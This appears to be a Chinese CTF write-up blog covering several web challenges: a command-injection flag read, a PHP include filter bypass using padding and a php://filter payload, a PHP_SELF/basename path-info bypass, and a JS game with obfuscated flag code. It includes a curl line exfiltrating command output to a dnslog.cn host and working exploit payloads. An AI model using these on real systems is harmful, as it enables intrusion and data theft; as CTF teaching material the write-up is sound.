<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">tac</span> /fllll?aaaaaaggggggg|<span class="hljs-built_in">tee</span> 1.txt<br></code></pre></td></tr></table></figure>
<p>dns外带可以，但效果有限</p>
<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">?url=curl `l\s`.<span class="hljs-number">6</span>lwgd3.dnslog.cn<br></code></pre></td></tr></table></figure>
<p><img src="/images/D6DE42843F044a4fABE9F77181C247BF.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="鹏城杯-2022-简单包含"><a href="#鹏城杯-2022-简单包含" class="headerlink" title="[鹏城杯 2022]简单包含"></a>[鹏城杯 2022]简单包含</h2><p><img src="/images/28DCF2F6363C4d8a81D178C649B0FF91.png" srcset="/img/loading.gif" lazyload><br>这题貌似特别简单，给了入口伪协议就好，那么我们伪协议试试<br><img src="/images/ED32879844344a6f83A8215334496EA3.png" srcset="/img/loading.gif" lazyload><br>竟然爆了waf，我们看一下index.php的内容</p>
<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-php"><span class="hljs-meta">&lt;?php</span></span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-variable">$path</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;flag&quot;</span>];</span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>)) &lt; <span class="hljs-number">800</span> &amp;&amp; <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/flag/&#x27;</span>, <span class="hljs-variable">$path</span>)) &#123;</span><br><span class="language-php">    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;nssctf waf!&#x27;</span>;</span><br><span class="language-php">&#125; <span class="hljs-keyword">else</span> &#123;</span><br><span class="language-php">    @<span class="hljs-keyword">include</span>(<span class="hljs-variable">$path</span>);</span><br><span class="language-php">&#125;</span><br><span class="language-php"><span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;color: #000000&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;color: #0000BB&quot;</span>&gt;</span><span class="hljs-symbol">&amp;lt;</span>?php<span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span>highlight_file<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;color: #007700&quot;</span>&gt;</span>(<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;color: #0000BB&quot;</span>&gt;</span>__FILE__<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;color: #007700&quot;</span>&gt;</span>);<span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span>include(<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;color: #0000BB&quot;</span>&gt;</span>$_POST<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;color: #007700&quot;</span>&gt;</span>[<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;color: #DD0000&quot;</span>&gt;</span>&quot;flag&quot;<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;color: #007700&quot;</span>&gt;</span>]);<span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;color: #FF8000&quot;</span>&gt;</span>//flag<span class="hljs-symbol">&amp;nbsp;</span>in<span class="hljs-symbol">&amp;nbsp;</span>/var/www/html/flag.php;<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span></span><br></code></pre></td></tr></table></figure>
<p>解码后发现刚才的php代码竟然是假冒的<br>禁用了flag，当然这题可以filter链漏洞直接过<br>但是常规的办法是看它的if语句</p>
<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">strlen(<span class="hljs-name">file_get_contents</span>(&#x27;php<span class="hljs-symbol">://input</span>&#x27;)) &lt; <span class="hljs-number">800</span><br></code></pre></td></tr></table></figure>
<p>因为是and的关系，所以我们要让第一个判断为false</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-number">800</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br><br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">a=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&amp;flag=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/</span>resource=flag.php<br></code></pre></td></tr></table></figure>

<p>然后就执行了伪协议，将base64编码后的flag.php显示出来了</p>
<h2 id="鹤城杯-2021-EasyP"><a href="#鹤城杯-2021-EasyP" class="headerlink" title="[鹤城杯 2021]EasyP"></a>[鹤城杯 2021]EasyP</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs awk">&lt;?php<br>include <span class="hljs-string">&#x27;utils.php&#x27;</span>;<br><br><span class="hljs-keyword">if</span> (isset(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;guess&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$guess</span> = (string) <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;guess&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$guess</span> === <span class="hljs-variable">$secret</span>) &#123;<br>        <span class="hljs-variable">$message</span> = <span class="hljs-string">&#x27;Congratulations! The flag is: &#x27;</span> . <span class="hljs-variable">$flag</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$message</span> = <span class="hljs-string">&#x27;Wrong. Try Again&#x27;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/utils\.php\/*$/i&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;hacker :)&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/show_source/&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;hacker :)&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> (isset(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;show_source&#x27;</span>])) &#123;<br>    highlight_file(basename(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>]));<br>    <span class="hljs-keyword">exit</span>();<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    show_source(__FILE__);<br>&#125;<br>?&gt; <br></code></pre></td></tr></table></figure>

<p>先了解一下$_SERVER参数</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">案例网址：https:<span class="hljs-regexp">//</span>www.shawroot.cc<span class="hljs-regexp">/php/i</span>ndex.php<span class="hljs-regexp">/test/</span>foo?username=root<br><span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>] 	得到：<span class="hljs-regexp">/php/i</span>ndex.php<span class="hljs-regexp">/test/</span>foo<br><span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>] 得到：<span class="hljs-regexp">/php/i</span>ndex.php<span class="hljs-regexp">/test/</span>foo?username=root<br></code></pre></td></tr></table></figure>

<p>$_SERVER’REQUEST_URI’不会将参数中的特殊符号进行转换，<br>也就是说它获取到的url上面的值，不会进行url解码</p>
<p>basename()：返回路径中的文件名部分</p>
<p>例子：<br>127.0.0.1&#x2F;pikachu&#x2F;index.php?file&#x3D;1.php 显示：1.php</p>
<p>127.0.0.1&#x2F;pikachu&#x2F;index.php?file&#x3D;flag.php&#x2F;1.php 显示：1.php</p>
<p>先上payload结合解释</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/index.php/u</span>tils.php/%ff?%<span class="hljs-number">73</span>how_source=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
<p>&#x2F;index.php&#x2F;utils.php&#x2F;%ff：在php中，&#x2F;index.php&#x2F;utils.php&#x2F;%ff被解析为一个路径信息(Path info),并被设置为$_SERVER[‘PATH_INFO’] 变量的值。然后，这个路径信息会被添加到$_SERVER[‘PHP_SELF’] 中，即$_SERVER[‘PHP_SELF’] &#x3D; ‘&#x2F;index.php&#x2F;utils.php&#x2F;%ff’。</p>
<p>%ff是url编码中的一个特殊字符，代表一个非打印字符。在PHP中，非打印字符通常会被忽略。所以，&#x2F;utils.php&#x2F;%ff实际上被PHP解析为&#x2F;utils.php&#x2F;</p>
<p>然后，当PHP执行highlight_file(basename($_SERVER[‘PHP_SELF’]));这段代码时，basename($_SERVER[‘PHP_SELF’])会返回utils.php，因为basename()函数返回路径中的最后一部分，也就是文件名，所以，&#x2F;index.php&#x2F;utils.php&#x2F;%ff 最终被解析为 &#x2F;utils.php。<br>其中show_source还可以以show source或show+source替代</p>
<p><strong>%ff的作用解析</strong><br>当你访问&#x2F;index.php&#x2F;utils.php时，实际上你正在访问index.php这个文件，而&#x2F;utils.php被视为“路径信息”这是因为在PHP中，路径信息是可以通过$_SERVER[‘PATH_INFO’]来获取的，而不是直接作为文件名处理的，所以当你调用basename(_SERVER[‘PHP_SELF’]) 时，它实际上会返回index.php，因为这是正在执行的脚本文件。</p>
<p>当你访问&#x2F;index.php&#x2F;utils.php&#x2F;%ff时，情况就变了。%ff是一个URL编码的非打印字符，PHP在处理URL时会忽略它。因此utils.php&#x2F;%ff实际上被解析为utils.php。这就使得basename($_SERVER[‘PHP_SELF’]) 返回 utils.php，而不是 index.php。</p>
<p>这是因为PHP在处理URL时，会将%ff之后的部分视为路径信息，而将%ff之前的部分视为文件名。所以在这种情况下utils.php%ff被解析为utils.php,并且basename($_SERVER[‘PHP_SELF’]) 会返回 utils.php。</p>
<p>值得注意的是</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/utils\.php\/*$/i&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;hacker :)&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
<p>明明我们的url中有utils.php，但为什么没有触发这个正则呢，因为这个是后匹配(匹配输入字符串的结束位置)</p>
<p>可以用vps模拟一下这个过程<br>测试代码</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs awk">&lt;?php<br><br><br>echo <span class="hljs-string">&quot;SERVER[&#x27;PHP_SELF&#x27;]   =  &quot;</span>.<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>];<br>echo <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br>var_dump(preg_match(<span class="hljs-string">&#x27;/utils\.php\/*$/i&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>]));<br><span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/utils\.php\/*$/i&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;hacker :)&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/show_source/&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;hacker :)&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> (isset(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;show_source&#x27;</span>])) &#123;<br>    highlight_file(basename(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>]));<br>    echo <span class="hljs-string">&#x27;basename = =&#x27;</span>.basename(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>]);<br>    <span class="hljs-keyword">exit</span>();<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    show_source(__FILE__);<br>&#125;<br>?&gt; <br></code></pre></td></tr></table></figure>

<p><img src="/images/8546C70DBD82478dA964ADFBC67556C4.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="GDOUCTF-2023-hate-eat-snake"><a href="#GDOUCTF-2023-hate-eat-snake" class="headerlink" title="[GDOUCTF 2023]hate eat snake"></a>[GDOUCTF 2023]hate eat snake</h2><p>游戏题<br><img src="/images/4A2117B4B784427082E78CEA98CFD4FC.png" srcset="/img/loading.gif" lazyload><br>这种一般都是js，找一下flag<br>在snake.js中找到<br><img src="/images/6846416A39CC4aea908BCAC145997748.png" srcset="/img/loading.gif" lazyload><br>貌似是自己的函数嵌套加密，js代码混淆<br>在网页上我们改不了js代码，但是我们可以把网页搬到本地里<br>然后把if(this’getScore’&gt;0)，创造一个我们自己的条件，本地运行<br><img src="/images/9CCAFF648B8A4c50805D05687CF5A2F7.png" srcset="/img/loading.gif" lazyload></p>
<p>或者把那一整串加密函数复制下来放到控制台上</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">function</span> _0x2615()&#123;var _0x30b7fe=[&#x27;C2vHCMnO&#x27;,&#x27;Dg9tDhjPBMC&#x27;,&#x27;DuLywKG&#x27;,&#x27;BgvUz3rO&#x27;,&#x27;CMv0DxjUicHMDq&#x27;,&#x27;y29UC29Szq&#x27;,&#x27;Aw5MBW&#x27;,&#x27;CM4GDgHPCYiPka&#x27;,&#x27;yvz6uuW&#x27;,&#x27;otuYnZiWwxDjwwHS&#x27;,&#x27;kcGOlISPkYKRkq&#x27;,&#x27;y29UC3rYDwn0BW&#x27;,&#x27;AZnYx2GWCgvFDa&#x27;,&#x27;ELvTAfO&#x27;,&#x27;Cu5JwK8&#x27;,&#x27;DvjNreK&#x27;,&#x27;zKHowxC&#x27;,&#x27;wwj5u3u&#x27;,&#x27;Aun1y2u&#x27;,&#x27;D2fYBG&#x27;,&#x27;AxjSzNjPzw5KFq&#x27;,&#x27;DuTYBhO&#x27;,&#x27;Eg5KCK4&#x27;,&#x27;A0viDfK&#x27;,&#x27;t1PAu04&#x27;,&#x27;wKDMC0O&#x27;,&#x27;yxbWBhK&#x27;,&#x27;C29huKO&#x27;,&#x27;ELbnu1a&#x27;,&#x27;sKnlqMu&#x27;,&#x27;mZq2ode4D1nKqvPl&#x27;,&#x27;B0fzAhy&#x27;,&#x27;C3bSAxq&#x27;,&#x27;nJiXmZCZmMXkqKvfwG&#x27;,&#x27;y3rVCIGICMv0Dq&#x27;,&#x27;BMn0Aw9UkcKG&#x27;,&#x27;mZe5odC1m0jfAfDJyG&#x27;,&#x27;ChjVDg90ExbL&#x27;,&#x27;zMLmywK&#x27;,&#x27;Bg9N&#x27;,&#x27;nZaWy1fIr1zd&#x27;,&#x27;sw16u0y&#x27;,&#x27;s2LOs0m&#x27;,&#x27;mZa2EfD0yNrK&#x27;,&#x27;x19WCM90B19F&#x27;,&#x27;qxbwC2y&#x27;,&#x27;zgPJrwG&#x27;,&#x27;EMPgDKG&#x27;,&#x27;uMjwufa&#x27;,&#x27;qvbHAMS&#x27;,&#x27;D21JtMu&#x27;,&#x27;yMLUza&#x27;,&#x27;mJe1mtbYsw9mqw0&#x27;,&#x27;zgzQELu&#x27;,&#x27;uNrItxe&#x27;,&#x27;mZKZmZuYCxvStLDN&#x27;,&#x27;mNWXFdb8nhW1Fa&#x27;,&#x27;vxLOBgS&#x27;,&#x27;tLntq1rgE0PFma&#x27;,&#x27;nta3mdi1ohnisvrvDq&#x27;,&#x27;s3nNzge&#x27;,&#x27;B19OyxzLx0bFzW&#x27;,&#x27;E30Uy29UC3rYDq&#x27;];_0x2615=function()&#123;return _0x30b7fe;&#125;;return _0x2615();&#125;(function(_0x9c05b6,_0x3cd1af)&#123;var _0x14de83=&#123;_0x2eff5d:<span class="hljs-number">0</span>x515,_0x379093:<span class="hljs-number">0</span>x517,_0x28a866:<span class="hljs-number">0</span>x4fb,_0x138c8b:<span class="hljs-number">0</span>x4d9,_0x44fc29:<span class="hljs-number">0</span>x4ea,_0x31227a:<span class="hljs-number">0</span>x4f8,_0x289b75:<span class="hljs-number">0</span>xbb,_0x5370c2:<span class="hljs-number">0</span>xc0,_0x5787b9:<span class="hljs-number">0</span>xd5,_0x1ad93d:<span class="hljs-number">0</span>xcd,_0xe984c4:<span class="hljs-number">0</span>xc6,_0x237902:<span class="hljs-number">0</span>xe9,_0x348752:<span class="hljs-number">0</span>xc5,_0x31acff:<span class="hljs-number">0</span>xc1,_0x29000f:<span class="hljs-number">0</span>xa9,_0x27647b:<span class="hljs-number">0</span>x52e,_0x460527:<span class="hljs-number">0</span>x535,_0x2aaf24:<span class="hljs-number">0</span>xd4,_0x399fbe:<span class="hljs-number">0</span>xd2,_0x6657d2:<span class="hljs-number">0</span>xcc,_0x374113:<span class="hljs-number">0</span>xbe,_0x971dcb:<span class="hljs-number">0</span>xbd,_0x2d75b0:<span class="hljs-number">0</span>xca,_0x27e959:<span class="hljs-number">0</span>xb5,_0x3154a8:<span class="hljs-number">0</span>xb9&#125;,_0x3d91c3=&#123;_0x2b5c86:<span class="hljs-number">0</span>x2a7&#125;,_0x2ef8df=&#123;_0xa9f18e:<span class="hljs-number">0</span>x32f&#125;;function _0x19c108(_0x40885c,_0xff529f,_0x5259a1,_0x44205b)&#123;return _0x3b1f(_0x5259a1-_0x2ef8df._0xa9f18e,_0xff529f);&#125;function _0x258a90(_0x130138,_0x35de99,_0x370399,_0x19391d)&#123;return _0x3b1f(_0x35de99- -_0x3d91c3._0x2b5c86,_0x19391d);&#125;var _0x4c122a=_0x9c05b6();while(!![])&#123;try&#123;var _0x2f5b83=parseInt(_0x19c108(_0x14de83._0x2eff5d,<span class="hljs-number">0</span>x515,<span class="hljs-number">0</span>x4ff,_0x14de83._0x379093))/(-<span class="hljs-number">0</span>x349*<span class="hljs-number">0</span>x1+-<span class="hljs-number">0</span>x3*<span class="hljs-number">0</span>xba7+<span class="hljs-number">0</span>x263f)+parseInt(_0x19c108(_0x14de83._0x28a866,_0x14de83._0x138c8b,_0x14de83._0x44fc29,_0x14de83._0x31227a))/(<span class="hljs-number">0</span>x156b+<span class="hljs-number">0</span>x8b*<span class="hljs-number">0</span>xe+-<span class="hljs-number">0</span>x1d03)+-parseInt(_0x258a90(-_0x14de83._0x289b75,-<span class="hljs-number">0</span>xd1,-<span class="hljs-number">0</span>xe4,-_0x14de83._0x5370c2))/(<span class="hljs-number">0</span>x655*-<span class="hljs-number">0</span>x1+-<span class="hljs-number">0</span>x76*<span class="hljs-number">0</span>x15+<span class="hljs-number">0</span>x1006)+parseInt(_0x258a90(-_0x14de83._0x5787b9,-_0x14de83._0x1ad93d,-_0x14de83._0xe984c4,-_0x14de83._0x237902))/(-<span class="hljs-number">0</span>x2028+<span class="hljs-number">0</span>xecd*-<span class="hljs-number">0</span>x1+<span class="hljs-number">0</span>x2ef9)*(parseInt(_0x258a90(-_0x14de83._0x348752,-_0x14de83._0x31acff,-_0x14de83._0x29000f,-<span class="hljs-number">0</span>xa2))/(<span class="hljs-number">0</span>xb4e*-<span class="hljs-number">0</span>x1+<span class="hljs-number">0</span>x1236+-<span class="hljs-number">0</span>x2b*<span class="hljs-number">0</span>x29))+parseInt(_0x19c108(_0x14de83._0x27647b,_0x14de83._0x460527,<span class="hljs-number">0</span>x51c,<span class="hljs-number">0</span>x536))/(-<span class="hljs-number">0</span>x22ad+-<span class="hljs-number">0</span>x925+<span class="hljs-number">0</span>x8*<span class="hljs-number">0</span>x57b)+parseInt(_0x258a90(-<span class="hljs-number">0</span>xd9,-_0x14de83._0x2aaf24,-_0x14de83._0x399fbe,-_0x14de83._0x2aaf24))/(-<span class="hljs-number">0</span>x564+-<span class="hljs-number">0</span>x2664+<span class="hljs-number">0</span>x2bcf)+parseInt(_0x258a90(-_0x14de83._0x6657d2,-_0x14de83._0x374113,-<span class="hljs-number">0</span>xa9,-<span class="hljs-number">0</span>xcd))/(-<span class="hljs-number">0</span>x178*-<span class="hljs-number">0</span>x8+-<span class="hljs-number">0</span>x1*-<span class="hljs-number">0</span>x2af+<span class="hljs-number">0</span>x1*-<span class="hljs-number">0</span>xe67)*(-parseInt(_0x258a90(-_0x14de83._0x971dcb,-_0x14de83._0x2d75b0,-_0x14de83._0x27e959,-_0x14de83._0x3154a8))/(<span class="hljs-number">0</span>x837+-<span class="hljs-number">0</span>x7b9+-<span class="hljs-number">0</span>xd*<span class="hljs-number">0</span>x9));if(_0x2f5b83===_0x3cd1af)break;else _0x4c122a[&#x27;push&#x27;](_0x4c122a[&#x27;shift&#x27;]());&#125;catch(_0x37c27d)&#123;_0x4c122a[&#x27;push&#x27;](_0x4c122a[&#x27;shift&#x27;]());&#125;&#125;&#125;(_0x2615,-<span class="hljs-number">0</span>x1d40d+<span class="hljs-number">0</span>x5e216*-<span class="hljs-number">0</span>x2+<span class="hljs-number">0</span>x164db7));function _0x3b1f(_0x13dbeb,_0x5cc9c2)&#123;var _0x9dd244=_0x2615();return _0x3b1f=function(_0x6bb205,_0x1a837a)&#123;_0x6bb205=_0x6bb205-(-<span class="hljs-number">0</span>xa10+-<span class="hljs-number">0</span>xf4e+<span class="hljs-number">0</span>x1b11);var _0x4a9901=_0x9dd244[_0x6bb205];if(_0x3b1f[&#x27;ezcADE&#x27;]===undefined)&#123;var _0x737fa1=function(_0xdd69cc)&#123;var _0x32b23a=&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=&#x27;;var _0x291519=&#x27;&#x27;,_0xe543a9=&#x27;&#x27;,_0x56d82c=_0x291519+_0x737fa1;for(var _0x38d1b8=<span class="hljs-number">0</span>x1493+-<span class="hljs-number">0</span>xf22+-<span class="hljs-number">0</span>x571,_0x20fe78,_0x2e67a2,_0x112ad9=<span class="hljs-number">0</span>x95f*<span class="hljs-number">0</span>x1+<span class="hljs-number">0</span>x17*-<span class="hljs-number">0</span>x11d+<span class="hljs-number">0</span>x103c;_0x2e67a2=_0xdd69cc[&#x27;charAt&#x27;](_0x112ad9++);~_0x2e67a2&amp;&amp;(_0x20fe78=_0x38d1b8%(<span class="hljs-number">0</span>x2248+<span class="hljs-number">0</span>x1*-<span class="hljs-number">0</span>x249e+-<span class="hljs-number">0</span>x2b*-<span class="hljs-number">0</span>xe)?_0x20fe78*(-<span class="hljs-number">0</span>x11e2+-<span class="hljs-number">0</span>x12*-<span class="hljs-number">0</span>x13e+-<span class="hljs-number">0</span>x43a)+_0x2e67a2:_0x2e67a2,_0x38d1b8++%(<span class="hljs-number">0</span>x15f8+<span class="hljs-number">0</span>x4*<span class="hljs-number">0</span>x5db+<span class="hljs-number">0</span>xb0*-<span class="hljs-number">0</span>x42))?_0x291519+=_0x56d82c[&#x27;charCodeAt&#x27;](_0x112ad9+(-<span class="hljs-number">0</span>x17*<span class="hljs-number">0</span>x13+-<span class="hljs-number">0</span>xbe4+<span class="hljs-number">0</span>x1*<span class="hljs-number">0</span>xda3))-(<span class="hljs-number">0</span>x1a*<span class="hljs-number">0</span>x112+<span class="hljs-number">0</span>x256*<span class="hljs-number">0</span>x1+-<span class="hljs-number">0</span>x1e20*<span class="hljs-number">0</span>x1)!==-<span class="hljs-number">0</span>xd32+-<span class="hljs-number">0</span>x1*<span class="hljs-number">0</span>x7f3+<span class="hljs-number">0</span>x1*<span class="hljs-number">0</span>x1525?String[&#x27;fromCharCode&#x27;](-<span class="hljs-number">0</span>x21b6+<span 